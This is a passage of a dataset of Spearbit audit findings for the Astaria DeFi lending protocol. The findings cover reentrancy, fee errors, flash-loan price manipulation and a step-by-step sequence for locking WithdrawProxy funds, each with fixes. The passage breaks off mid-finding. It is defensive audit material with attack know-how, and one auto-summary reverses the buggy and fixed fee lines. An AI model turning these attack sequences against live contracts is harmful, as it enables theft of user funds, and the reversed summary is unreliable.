\\]\n\nAnd so:\n\n\\[ \\Delta A = w_r + \\left( \\frac{SW}{S} \\right) E \\]\n\nTo be able to call `processEpoch()` again, we need to ensure that \\( w_r \\) tokens have been transferred to \\( W_n \\) either from the public vault's assets \\( B \\) or from \\( W_{n+1} \\) assets. \n\n**Note:** At this point, \\( w_r \\) equals:\n\n\\[ w_r = \\frac{SW}{S}B + \\frac{SW}{S}X + s \\cdot 2U_1a(s,t_p) \\]\n\nThe \\(\\frac{SW}{S}B\\) is an actual asset and can be transferred to \\( W_n \\) right away. The \\(\\frac{SW}{S}X\\) portion is a percentage of the amount owed by active liens at the time \\( processEpoch() \\) was called. Depending on whether these liens get paid fully or not, we would have:\n\n- **If fully paid:** There are no risks for future shareholders to bear.\n- **If not fully paid:** Since we have transferred \\(\\frac{SW}{S}X\\) from the actual asset balance to \\( W_n \\), the redeeming shareholder would not take the risk of these liens being liquidated for less than their value. However, these risks are transferred to upcoming shareholders or shareholders who have not yet redeemed their positions.\n\n## Recommendation\nThe above should be noted for users and documented. To safeguard, we should define:\n\n\\[ w_r = \\frac{SW}{S}B \\]\n\nAnd only transfer the portions of the exited liens to \\( W_n \\) that corresponds to \\(\\frac{SW}{S}X\\). This would require changes to the accounting of the `WithdrawProxy` and potentially delay the withdrawal shares a bit further.",
      "summary": "\nThis bug report addresses the issue of risk transfer when the processEpoch() endpoint is called in the PublicVault.sol file. Before the endpoint is called, the total assets, A, is equal to A=y0+s(t-tlast)=B+Xs2U1a(s,t)+P(s,tl)2U2a(s,tl). After the endpoint is called, the total assets, A0, is equal to y0+s(t-tp), and the withdraw reserve, wr, is equal to (SW/S)B+(SW/S)Xs2U1a(s,tp). If the liens are not fully paid, the risk is transferred to the upcoming shareholders or those who have not redeemed their positions yet. \n\nThe recommendation is to document this risk and define wr=(SW/S)B, and only transfer the portion of the exited liens to Wn that corresponds to (SW/S)P2U1a(s,tp). This would require changes to the accounting of the WithdrawProxy and potentially delay the withdraw shares a bit further.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21847",
      "title": "Canceled Seaport auctions can still be claimed by the liquidator",
      "impact": "MEDIUM",
      "content": "## Audit Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `CollateralToken.sol#L263-L271`\n- `AstariaRouter.sol#L696`\n\n## Description\nCanceled auctions can still be claimed by the liquidator.\n\n```solidity\nif (\n    s.idToUnderlying[collateralId].auctionHash !=\n    s.SEAPORT.getOrderHash(getOrderComponents(params, counterAtLiquidation))\n) {\n    // revert auction params don't match\n    revert InvalidCollateralState(\n        InvalidCollateralStates.INVALID_AUCTION_PARAMS\n    );\n}\n```\n\nIf in the future we would add an authorized endpoint that could call `s.SEAPORT.incrementCounter()` to cancel all outstanding NFT auctions, the liquidator can call this endpoint `liquidatorNFTClaim(..., counterAtLiquidation)` where `counterAtLiquidation` is the old counter to claim its NFT after the canceled Seaport auction ends.\n\n## Recommendation\nMake sure to use the current Seaport counter when authenticating an auction hash.\n\n```solidity\nif (\n    s.idToUnderlying[collateralId].auctionHash !=\n    s.SEAPORT.getOrderHash(getOrderComponents(params, s.SEAPORT.getCounter(address(this))))\n) {\n    // revert auction params don't match\n    revert InvalidCollateralState(\n        InvalidCollateralStates.INVALID_AUCTION_PARAMS\n    );\n}\n```\n\n## Astaria\nThe goal was to allow the case where non-canceled auctions (expired) could still be retrieved; there's no interest in incrementing nonces. Recommendation applied in PR 343.\n\n## Spearbit\nFixed.",
      "summary": "\nThis bug report is about a medium risk issue with the CollateralToken.sol and AstariaRouter.sol. The issue is that canceled auctions can still be claimed by the liquidator. The recommendation is to make sure to use the current Seaport counter when authenticating an auction hash. This was applied in PR 343 and has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21846",
      "title": "The liquidation's auction starting price is not chosen perfectly",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- **File:** AstariaRouter.sol\n- **Line:** L703\n\n## Description\nWhen a lien is expired and liquidated, the starting price for its Seaport auction is chosen as `stack.lien.details.liquidationInitialAsk`. It would make more sense to have the `startingPrice` to be the maximum of the amount owed up to now and the `stack.lien.details.liquidationInitialAsk`:\n\n```\nstartingPrice = max(amountOwed, liquidationInitialAsk)\n```\n\nFor example, if the `liquidate(...)` endpoint is called way after the lien's expiration time, the amount owed might be bigger than the `stack.lien.details.liquidationInitialAsk`. When a lien is created, the protocol checks that `stack.lien.details.liquidationInitialAsk` is not smaller than the to-be-owed amount at the end of the lien's term. However, the lien can keep accruing interest if it is not liquidated right away when it gets expired.\n\n## Recommendation\nUse the recommendation above and set `startingPrice` as follows:\n\n```solidity\nuint256 startingPrice = Math.max(\n    stack.lien.details.liquidationInitialAsk,\n    s.LIEN_TOKEN.getOwed(stack)\n);\n```\n\n## Status\n- **Astaria:** Fixed in PR 337.\n- **Spearbit:** Fixed.",
      "summary": "\nThis bug report is about the AstariaRouter.sol#L703 code. When a lien is expired and liquidated, the starting price for its Seaport auction is chosen as stack.lien.details.liquidationInitialAsk. It would make more sense to have the startingPrice to be the maximum of the amount owed up to now and the stack.lien.details.liquidationInitialAsk. This is because if the liquidate(...) endpoint is called way after the lien's expiration time, the amount owed may be bigger than the stack.lien.details.liquidationInitialAsk. The recommendation is to set the startingPrice as the maximum of the stack.lien.details.liquidationInitialAsk and the s.LIEN_TOKEN.getOwed(stack). This bug has been fixed by Astaria in PR 337, and Spearbit has also fixed the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21845",
      "title": "Borrowers cannot provide slippage protection parameters when committing to a lien",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- **Location**: AstariaRouter.sol#L497-L504\n\n## Description\nWhen a borrower commits to a lien, `AstariaRouter` calls the strategy validator to fetch the lien details:\n\n```solidity\n(bytes32 leaf, ILienToken.Details memory details) = IStrategyValidator(\n    strategyValidator\n).validateAndParse(\n    commitment.lienRequest,\n    msg.sender,\n    commitment.tokenContract,\n    commitment.tokenId\n);\n```\n\nThe `details` include:\n```solidity\nstruct Details {\n    uint256 maxAmount;\n    uint256 rate; // rate per second\n    uint256 duration;\n    uint256 maxPotentialDebt; // not used anymore\n    uint256 liquidationInitialAsk;\n}\n```\n\nThe borrower cannot provide slippage protection parameters to ensure these three values do not enter undesired ranges.\n\n## Recommendation\nAllow the borrower to provide slippage protection parameters to prevent the `details` parameters from being set to undesired values:\n- **Rate**: Borrower provides an upper bound.\n- **Duration**: Borrower can provide lower and upper bounds. Lower bound protection is more important.\n- **Liquidation Initial Ask**: Borrower can provide lower and upper bounds. The protocol still checks that this value is not less than the amount owed at the end of the lien's term.",
      "summary": "\nThis bug report is related to the AstariaRouter.sol#L497-L504 code. When a borrower commits to a lien, AstariaRouter calls the strategy validator to fetch the lien details which include the rate, duration and liquidationInitialAsk. The problem is that the borrower cannot provide slippage protection parameters to make sure these 3 values cannot enter into some undesired ranges. The recommendation is to allow the borrower to provide slippage protection parameters to prevent the details parameters to be set to some undesired values. For rate, the borrower can provide an upper bound. For duration, the borrower can provide a lower and upper bound with the lower bound protection being more important. For liquidationInitialAsk, the borrower can provide a lower and upper bound but the protocol still checks that this value is not less than the to-be-owed amount at the end of the lien's term.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21844",
      "title": "Seaport auctions not compatible with USDT",
      "impact": "MEDIUM",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`CollateralToken.sol#L173`\n\n## Description\nAs per the ERC20 specification, the `approve()` function is expected to return a boolean:\n\n```solidity\nfunction approve(address _spender, uint256 _value) public returns (bool success)\n```\n\nHowever, USDT deviates from this standard, and its `approve()` method does not have a return value. Hence, if USDT is used as a payment token, the following line reverts in `validateOrder()` as it expects return data but doesn't receive it:\n\n```solidity\npaymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));\n```\n\n## Recommendation\nUse Solmate's `safeApprove()` function to accommodate USDT's `approve()`:\n\n```solidity\npaymentToken.safeApprove(address(transferProxy), s.LIEN_TOKEN.getOwed(stack));\n```\n\n## Additional Information\n- **Astaria:** Fixed in PR339.\n- **Spearbit:** Verified.",
      "summary": "\nThis bug report is about a medium risk issue with the CollateralToken.sol#L173. According to the ERC20 specification, the approve() method should return a boolean. However, for USDT, the approve() method does not have a return value. This causes the following line to revert in validateOrder() as it expects return data but doesn't receive it: paymentToken.approve(address(transferProxy), s.LIEN_TOKEN.getOwed(stack)).\n\nThe recommendation is to use solmate's safeApprove() function instead to accommodate USDT's approve(). This would look like paymentToken.safeApprove(address(transferProxy), s.LIEN_TOKEN.getOwed(stack)). The issue has been fixed in PR339 and verified by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [
        "USDT",
        "Weird ERC20",
        "SafeApprove",
        "Approve"
      ],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21843",
      "title": "Incorrect fee calculation in _handleStrategistInterestReward resulting in undercharged fees in PublicVault",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nLienToken.sol#L392-L430\n\n## Description\nIn the `PublicVault` contract, the function `_handleStrategistInterestReward` is being called during the `makePayment` process. However, it has been observed that the `TotalAssets` of the `PublicVault` does not change in `makePayment`, assuming it is a normal payment scenario. \n\n`_mint(owner(), feeInShares);` would result in a smaller fee collection by the protocol.\n\n### Example Calculation\nAssume:\n- `totalAssets = 2000`\n- `interestPaid = 1000`\n- `Vault_FEE = 50%`\n\n| totalSupply | totalAssets | protocolFee | protocolShares | pricePerShare |\n|-------------|-------------|--------------|----------------|----------------|\n| t0          | 1,000       | 2000         | --             | --             | 2              |\n| t1          | 1,000       | 2000         | 500            | 500 / 2 = 250  | -              |\n| t2          | 1,250       | 2000         | 500            | 250            | 1.6            |\n\nWhile the protocol should collect $500, it only collects \\( 250 \\times 1.6 = 400 \\).\n\nThe code should be:\n```solidity\nuint256 feeInShares = fee.mulDivDown(totalSupply(), totalAssets() - fee);\n```\ninstead of:\n```solidity\nuint256 feeInShares = fee.mulDivDown(totalSupply(), totalAssets());\n```\n\n## Resolution\n- **Astaria**: Fixed in PR 350.\n- **Spearbit**: Verified.",
      "summary": "\nThis bug report is about the PublicVault contract in the LienToken.sol file. It has been observed that the TotalAssets of the PublicVault does not change in the makePayment process, resulting in a smaller fee collection by the protocol. The severity of this bug is rated as Medium Risk. \n\nThe bug was caused by the line of code “uint256 feeInShares = fee.mulDivDown(totalSupply(), totalAssets() - fee);”, which should have been “uint256 feeInShares = fee.mulDivDown(totalSupply(), totalAssets());”. \n\nTo illustrate the bug, assume totalAssets = 2000, interestPaid = 1000, and Vault_FEE = 50%. Then, the totalSupply, totalAssets, protocolFee, protocolShares, and pricePerShare at t0, t1, and t2 would be as follows: \n\nt0: totalSupply = 1000, totalAssets = 2000, protocolFee = --, protocolShares = --, pricePerShare = 2\nt1: totalSupply = 1000, totalAssets = 2000, protocolFee = 500, protocolShares = 500/2 = 250, pricePerShare = 2\nt2: totalSupply = 1250, totalAssets = 2000, protocolFee = 500, protocolShares = 250, pricePerShare = 1.6\n\nIn this scenario, the protocol should collect 500$, but it only collects 250 * 1.6 = 400. \n\nThe bug has been fixed in PR 350 and verified by Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21842",
      "title": "Users pay protocol fee for interests they do not get",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nPublicVault.sol#L629-L642\n\n## Description\nThe `PublicVault._handleStrategistInterestReward()` function currently charges a protocol fee from minting vault shares, affecting all vault LP participants. However, not every user receives interest payments. Consequently, a scenario may arise where a user deposits funds into the PublicVault before a loan is repaid, resulting in the user paying more in protocol fees than the interest earned. This approach appears to be unfair to certain users, leading to a disproportionate fee structure for those who do not benefit from the interest rewards.\n\n## Recommendation\nThis is an edge case where, in certain instances, users may lose money from providing LP. The root cause of this is the way PublicVault values the total assets considered the interests being paid evenly according to time. However, the protocol fee is charged when the payment is made.\n\n### PublicVault.totalAssets\n```solidity\nfunction _totalAssets(VaultData storage s) internal view returns (uint256) {\n    uint256 delta_t = block.timestamp - s.last;\n    return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);\n}\n```\n\nThere are three potential paths to address this issue:\n1. Acknowledge the risks and inform users of the risks.\n2. Change the way PublicVault records the interests. Distribute the interest to all vault LP participants when the payment is made. This is the design most yield aggregation vaults adopt. The totalAssets only increases when the protocol receives the money. The design can be cleaner this way.\n\n    ```solidity\n    function _totalAssets(VaultData storage s) internal view returns (uint256) {\n        return uint256(s.yIntercept);\n    }\n    \n    function updateVault(UpdateVaultParams calldata params) external {\n        _onlyLienToken();\n        VaultData storage s = _loadStorageSlot();\n        _accrue(s);\n        // We are a payment\n        if (params.decreaseInYIntercept > 0) {\n            _setYIntercept(s, s.yIntercept - params.decreaseInYIntercept);\n        } else {\n            increaseYIntercept(params.interestPaid);\n        }\n        _handleStrategistInterestReward(s, params.interestPaid);\n    }\n    ```\n\n3. Set the post-protocol fee `s.slope` and transfer protocol fees to the owner when a payment is made.\n\n    ```solidity\n    function _addLien(\n        uint256 tokenId,\n        uint256 lienSlope,\n        uint40 lienEnd\n    ) internal {\n        VaultData storage s = _loadStorageSlot();\n        _accrue(s);\n        lienSlope = lienSlope.mulWadDown(1e18 - VAULT_FEE());\n        uint256 newSlope = s.slope + lienSlope;\n        _setSlope(s, newSlope);\n        uint64 epoch = getLienEpoch(lienEnd);\n        _increaseOpenLiens(s, epoch);\n        emit LienOpen(tokenId, epoch);\n    }\n    ```\n\n## Astaria\nBased on our research, we will accept option 1 as the recommendation. We attempted a toy implementation that involved keeping the strategist reward off the books until repayment or liquidation. Such an implementation requires a significant overhaul of the code base.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the PublicVault._handleStrategistInterestReward() function in the PublicVault.sol smart contract. The function currently charges a protocol fee from minting vault shares, which affects all vault LP participants. However, not all users receive interest payments, leading to a situation where some users may end up paying more in protocol fees than the interest earned. This could lead to a disproportionate fee structure for those who do not benefit from the interest rewards.\n\nTo address this issue, three potential solutions have been proposed. The first is to acknowledge the risks and inform users of the risks. The second is to change the way PublicVault records the interests, by distributing the interest to all vault LP when the payment is made. The third is to set the post protocol fee s.slope and transfer protocol fees to owner when a payment is made. After researching the issue, the recommended solution is to acknowledge the risks and inform users of the risks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21841",
      "title": "UNI_V3Validator fetches spot prices that may lead to price manipulation attacks",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`UNI_V3Validator.sol#L126-L130`\n\n## Description\n`UNI_V3Validator.validateAndParse()` checks the state of the Uniswap V3 position. This includes checking the LP value through `LiquidityAmounts.getAmountsForLiquidity`.\n\n```solidity\n//get pool state\n//get slot 0\n(uint160 poolSQ96, , , , , , ) = IUniswapV3PoolState(\n    V3_FACTORY.getPool(token0, token1, fee)\n).slot0();\n(uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(\n    poolSQ96,\n    TickMath.getSqrtRatioAtTick(tickLower),\n    TickMath.getSqrtRatioAtTick(tickUpper),\n    liquidity\n);\n```\n- **LiquidityAmounts.sol#L177-L221**\n\nWhen we deep dive into `getAmountsForLiquidity`, we see three cases: \n1. Price is below the range \n2. Price is within the range \n3. Price is above the range\n\n```solidity\nfunction getAmountsForLiquidity(\n    uint160 sqrtRatioX96,\n    uint160 sqrtRatioAX96,\n    uint160 sqrtRatioBX96,\n    uint128 liquidity\n) internal pure returns (uint256 amount0, uint256 amount1) {\n    unchecked {\n        if (sqrtRatioAX96 > sqrtRatioBX96)\n            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n        if (sqrtRatioX96 <= sqrtRatioAX96) {\n            amount0 = getAmount0ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n        } else if (sqrtRatioX96 < sqrtRatioBX96) {\n            amount0 = getAmount0ForLiquidity(\n                sqrtRatioX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n            amount1 = getAmount1ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioX96,\n                liquidity\n            );\n        } else {\n            amount1 = getAmount1ForLiquidity(\n                sqrtRatioAX96,\n                sqrtRatioBX96,\n                liquidity\n            );\n        }\n    }\n}\n```\n\nFor simplicity, we can break into `getAmount1ForLiquidity`.\n\n```solidity\n/// @notice Computes the amount of token1 for a given amount of liquidity and a price range\n/// @param sqrtRatioAX96 A sqrt price representing the first tick boundary\n/// @param sqrtRatioBX96 A sqrt price representing the second tick boundary\n/// @param liquidity The liquidity being valued\n/// @return amount1 The amount of token1\nfunction getAmount1ForLiquidity(\n    uint160 sqrtRatioAX96,\n    uint160 sqrtRatioBX96,\n    uint128 liquidity\n) internal pure returns (uint256 amount1) {\n    unchecked {\n        if (sqrtRatioAX96 > sqrtRatioBX96)\n            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n        return FullMathUniswap.mulDiv(\n            liquidity,\n            sqrtRatioBX96 - sqrtRatioAX96,\n            FixedPoint96.Q96\n        );\n    }\n}\n```\n\nWe find the amount is calculated as `amount = liquidity * (upper price - lower price)`. When the `slot0.poolSQ96` is in LP range, the lower price is the `slot0.poolSQ96`, and the closer slot0 is to `lowerTick`, the smaller the `amount1` is.\n\nThis is vulnerable to price manipulation attacks as `IUniswapV3PoolState.slot0.poolSQ96` is effectively the spot price. Attackers can acquire huge funds through flash loans and shift the `slot0` by doing large swaps on Uniswap.\n\nAssume the following scenario:\n- The strategist signs a lien that allows the borrower to provide an ETH-USDC position with >1,000,000 USDC and borrow 1,000,000 USDC from the vault.\n- The attacker can first provide 1 ETH worth of LP at price range 2,000,000 ~ 2,000,001.\n- The attacker borrows a flash loan to manipulate the price of the pool and now the `slot0.poolSQ96 = sqrt(2,000,000)` (ignoring the decimal differences).\n- The `getAmountsForLiquidity` values the LP positions with the spot price, and finds the LP has 1 * 2,000,000 USDC in the position. The attacker borrows 2,000,000.\n- The attacker restores the price of the Uniswap pool and takes the profit to repay the flash loan.\n\nNote that the project team has stated clearly that `UNI_V3Validator` will not be used before the audit. This issue is filed to provide information to the codebase.\n\n## Recommendation\nFetch price from a reliable price oracle instead of `slot0`. Also, it is recommended to document the risk of `UNI_V3Validator` in the codebase or documentation.",
      "summary": "\nThis bug report details a vulnerability in the UNI_V3Validator.sol code. The vulnerability is related to the LiquidityAmounts.getAmountsForLiquidity function which is used to check the state of the Uniswap V3 position. This function has three cases - price is below the range, price is within the range, and price is above the range. \n\nThe issue is that the LiquidityAmounts.getAmountsForLiquidity function values the LP positions with the spot price. This is vulnerable to price manipulation attacks as IUniswapV3PoolState.slot0.poolSQ96 is effectively the spot price. Attackers can acquire huge funds through flash loans and shift the slot0 by doing large swaps on Uniswap. \n\nThe recommendation is to fetch the price from a reliable price oracle instead of slot0. Additionally, the risk of UNI_V3Validator should be documented in the codebase or documentation.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [
        "Uniswap",
        "Stale Price",
        "Flash Loan"
      ],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21840",
      "title": "Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context:\n- VaultImplementation.sol#L245\n- LienToken.sol#L226\n- PublicVault.sol#L686\n- PublicVault.sol#L690\n- VaultImplementation.sol#L230-L249\n- VaultImplementation.sol#L221\n- Vault.sol#L53-L58\n\n## Description:\nIn the `commitToLien(...)` flow, the following storage parameters are updated after some of the external callback sites when a payout is issued or a lien is transferred from a private vault to its owner:\n\n- **collateralStateHash in LienToken**: One can potentially re-enter to take another lien using the same collateral, but this is not possible since the collateral NFT token is already transferred to the CollateralToken (unless one is dealing with some esoteric NFT token). The `createLien(...)` requires this parameter to be `0`, and that's why a potential re-entrancy can bypass this requirement. \n  - **Read re-entrancy**: Yes\n- **slope in PublicVault**: \n  - **Read re-entrancy**: Yes\n- **liensOpenForEpoch in PublicVault**: If flash liens are allowed, one can re-enter and process the epoch before finishing the `commitToLien(...)`. Thus, the processed epoch would have open liens even though we want to ensure this cannot happen.\n  - **Read re-entrancy**: Yes\n\nThe re-entrancies can happen if the vault asset performs a callback to the receiver when transferring tokens (during issuance of payouts). If one is dealing with WETH, the native token amount is transferred to the borrower. Note that in the case of native tokens, if the following recommendation from the issue below is considered, the current issue could be of higher risk:\n- **'transfer(...) function in _issuePayout(...) can be replaced by a direct call'**\n\n## Recommendation:\nMake sure all the storage parameter updates are performed first before the calls to potentially external contracts. The following changes are required:\n\n1. Update the `collateralStateHash` before minting a lien for the vault:\n\n```diff\ndiff --git a/src/LienToken.sol b/src/LienToken.sol\nindex d22b459..e61d9dc 100644\n--- a/src/LienToken.sol\n+++ b/src/LienToken.sol\n@@ -220,17 +220,16 @@ contract LienToken is ERC721, ILienToken, AuthInitializable, AmountDeriver {\n revert InvalidSender();\n }\n- (lienId, newStack) = _createLien(s, params);\n+ (newStack) = _createLien(s, params);\n owingAtEnd = _getOwed(newStack, newStack.point.end);\n- s.collateralStateHash[params.lien.collateralId] = bytes32(lienId);\n emit NewLien(params.lien.collateralId, newStack);\n }\n function _createLien(\n LienStorage storage s,\n ILienToken.LienActionEncumber calldata params\n- ) internal returns (uint256 newLienId, ILienToken.Stack memory newSlot) {\n+ ) internal returns (ILienToken.Stack memory newSlot) {\n uint40 lienEnd = (block.timestamp + params.lien.details.duration)\n .safeCastTo40();\n Point memory point = Point({\n@@ -241,6 +240,8 @@ contract LienToken is ERC721, ILienToken, AuthInitializable, AmountDeriver {\n newSlot = Stack({lien: params.lien, point: point});\n newLienId = uint256(keccak256(abi.encode(newSlot)));\n+ s.collateralStateHash[params.lien.collateralId] = bytes32(newLienId);\n+\n _safeMint(\n params.receiver,\n newLienId,\n```\n\n2. For public vaults, first add the lien then issue payout:\n\n```diff\ndiff --git a/src/PublicVault.sol b/src/PublicVault.sol\nindex 654d8b1..c26c7b7 100644\n--- a/src/PublicVault.sol\n+++ b/src/PublicVault.sol\n@@ -487,8 +487,8 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n (address, uint256, uint40, uint256, address, uint256)\n );\n- _issuePayout(borrower, amount, feeTo, feeRake);\n+ _addLien(tokenId, lienSlope, lienEnd);\n _issuePayout(borrower, amount, feeTo, feeRake);\n }\n return IERC721Receiver.onERC721Received.selector;\n```",
      "summary": "\nA bug was identified in the commitToLien(...) flow of the VaultImplementation.sol, LienToken.sol, PublicVault.sol, and Vault.sol contracts. This bug could potentially allow for re-entrancy, which would bypass certain requirements and allow for a user to take another lien using the same collateral. This is because the collateral NFT token is already transferred to the CollateralToken, unless one is dealing with some esoteric NFT token. The issue is of medium risk and could be of higher risk if the transfer(...) function in _issuePayout(...) is replaced by a direct call. \n\nIn order to address the issue, it is recommended that all the storage parameter updates are performed first before the calls to potentially external contracts. This can be done by updating the collateralStateHash before minting a lien for the vault and by adding the lien then issuing the payout for public vaults. \n\nOverall, this bug could potentially allow for re-entrancy, which could bypass certain requirements. To address this issue, it is recommended that the storage parameter updates are done first before calls to external contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21839",
      "title": "transfer(...) function in _issuePayout(...) can be replaced by a direct call",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- VaultImplementation.sol#L245\n\n## Description\nIn the `_issuePayout(...)` internal function of the `VaultImplementation`, if the asset is WETH, the amount is withdrawn from WETH to native tokens and then transferred to the borrower:\n\n```solidity\nif (asset() == WETH()) {\n    IWETH9 wethContract = IWETH9(asset());\n    wethContract.withdraw(newAmount);\n    payable(borrower).transfer(newAmount);\n}\n```\n\nThe `transfer` limits the amount of gas shared to the call to the borrower, which would prevent executing a complex callback. Due to changes in gas prices in the EVM, it might even break some feature for a potential borrower contract. For the analysis of the flow for both types of vaults, please refer to the following issue:\n- 'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow'\n\n## Recommendation\nCall the borrower directly without restricting the gas shared and only apply this recommendation if the recommendation from the issue 'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow' is applied.",
      "summary": "\nThis bug report is about a medium risk issue in the _issuePayout(...) internal function of the VaultImplementation. If the asset is WETH, the amount is withdrawn from WETH to native tokens and then transferred to the borrower. The problem is that this transfer limits the amount of gas shared to the call to the borrower, which could prevent executing a complex callback and, due to changes in gas prices in EVM, might even break some features for a potential borrower contract. The recommendation is to call the borrower directly without restricting the gas shared, but only if the recommendation from the issue 'Storage parameters are updated after a few callback sites to external addresses in the commitToLien(...) flow' is applied.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21838",
      "title": "WithdrawProxy funds can be locked",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n- `WithdrawProxy.sol#L291-L293`\n- `WithdrawProxy.sol#L329`\n- `WithdrawProxy.sol#L383`\n- `PublicVault.sol#L349`\n\n## Description\nIf flash liens are allowed by a public vault, one call can lock up the funds to be redeemed of a WithdrawProxy by sandwiching a call to `processEpoch()`. This attack goes as follows:\n\n1. Assume the current epoch is `e1`. A public vault lender requests to withdraw at `e1`, which causes the WithdrawProxy for this epoch to be deployed and time passes.\n2. Someone opens a lien and gets liquidated during this epoch such that its auction ends past the next epoch `e2`, so that `W'sfinalAuctionEnd` becomes non-zero, and time passes.\n3. Process `e1` so that the current epoch to be processed next would be `e2`.\n4. Open a new lien for 1 wei with 0 duration.\n5. Instantly process `e2`. At this point, the `claim()` endpoint would be called on `W` to reset `finalAuctionEnd` to 0. At this point, the current epoch would be `e3`.\n6. Back-run and instantly liquidate the lien created in step 4 to set `W'sfinalAuctionEnd` to a non-zero value again.\n\nSince `W'sclaim()` endpoint is the only endpoint that resets `finalAuctionEnd` to 0 and this endpoint can only be called when the current epoch is the claimable epoch for `W`, which is `e2`, `finalAuctionEnd` will not be reset to 0 anymore as the epoch only increases in value. Therefore, since the redeem and withdraw endpoints of the WithdrawProxy are guarded by the `onlyWhenNoActiveAuction()` modifier:\n\n```solidity\nmodifier onlyWhenNoActiveAuction() {\n    WPStorage storage s = _loadSlot();\n    // If auction funds have been collected to the WithdrawProxy\n    // but the PublicVault hasn't claimed its share, too much money will be sent to LPs\n    if (s.finalAuctionEnd != 0) {\n        // if finalAuctionEnd is 0, no auctions were added\n        revert InvalidState(InvalidStates.NOT_CLAIMED);\n    }\n    _;\n}\n```\n\nThe `W` 